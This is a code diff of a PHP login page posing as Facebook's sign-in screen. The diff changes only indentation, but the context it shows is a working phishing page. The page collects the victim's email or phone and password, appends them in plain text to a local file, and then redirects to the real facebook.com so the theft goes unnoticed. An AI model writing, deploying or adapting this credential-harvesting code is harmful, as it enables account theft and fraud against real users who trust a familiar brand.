@@ -70,7 +70,7 @@
 <div class="login-container">
     <h2>Log in to Facebook</h2>
     <form class="login-form" action="" method="post">
-		<input type="text" name="username" placeholder="Email or Phone" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
+        <input type="text" name="username" placeholder="Email or Phone" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
         <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Log In</button>
     </form>
@@ -106,6 +106,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------FACEBOOK-------------------|\n";
     file_put_contents($filename, $data, FILE_APPEND);
-	header("Location: https://www.facebook.com");
+    header("Location: https://www.facebook.com");
 }
 ?>
